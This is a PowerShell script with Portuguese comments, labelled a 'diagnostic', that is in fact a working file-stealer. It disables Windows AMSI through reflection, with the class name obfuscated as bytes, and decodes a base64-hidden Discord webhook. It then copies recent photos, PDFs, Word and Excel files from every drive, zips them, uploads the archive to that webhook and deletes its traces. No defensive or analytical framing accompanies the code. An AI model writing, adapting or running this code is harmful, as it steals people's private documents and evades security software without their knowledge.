# [V23: Diagnóstico - Bypass AMSI]
Write-Host "[*] A iniciar bypass de AMSI..." -ForegroundColor Cyan
$n = [System.Text.Encoding]::UTF8.GetString([byte[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))
$t = [Ref].Assembly.GetType($n)
$f = $t.GetField("amsiInitFailed", "NonPublic,Static")
$f.SetValue($null, $true)

# 1. Configurações e TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wEnc = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NDM2MTE5NTQ0MzE5NjA2Ni9Hb1g5NjE5cmZuUzd6aGE4TUJaelhFZHNSZVNGb3NGWUZidEZ5VmZOUHZ4eWJKWHlYVnc3VGtMUG9qNU0tZzZuV2FYWA=="
$u = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($wEnc))

Write-Host "[*] A enviar notificação ao Discord..." -ForegroundColor Yellow
curl.exe -k -s -F "content=🚀 V23 (Diagnóstico) Ativo em $env:COMPUTERNAME" $u

$tempDir = "$env:TEMP\cache_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

# 2. Busca e Filtragem
Write-Host "[*] A procurar ficheiros recentes..." -ForegroundColor Cyan
$e = @('*.jpg', '*.pdf', '*.docx', '*.xlsx')
Get-PSDrive -PSProvider FileSystem | ForEach-Object {
    Get-ChildItem -Path $_.Root -Include $e -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
        $p = $_.FullName
        $isEx = $false; foreach($d in @("C:\Windows", "C:\Program Files")){if($p.StartsWith($d)){$isEx=$true;break}}
        !$isEx -and $_.LastWriteTime -gt (Get-Date).AddDays(-30) -and $_.Length -lt 15MB
    } | ForEach-Object { 
        Write-Host "[+] Encontrado: $($_.Name)" -ForegroundColor Gray
        Copy-Item $_.FullName -Destination $tempDir -ErrorAction SilentlyContinue 
    }
}

# 3. Compactação e Envio
$zipFile = "$env:TEMP\win_data.tmp"
if ((Get-ChildItem $tempDir).Count -gt 0) {
    Write-Host "[*] A enviar dados para o Discord..." -ForegroundColor Green
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force
    curl.exe -k -s -F "file=@$zipFile" $u
}

Write-Host "[+] Processo terminado. A aguardar 10s antes de limpar..." -ForegroundColor Green
Start-Sleep -Seconds 10
Remove-Item $tempDir -Recurse -Force; Remove-Item $zipFile -Force; exit
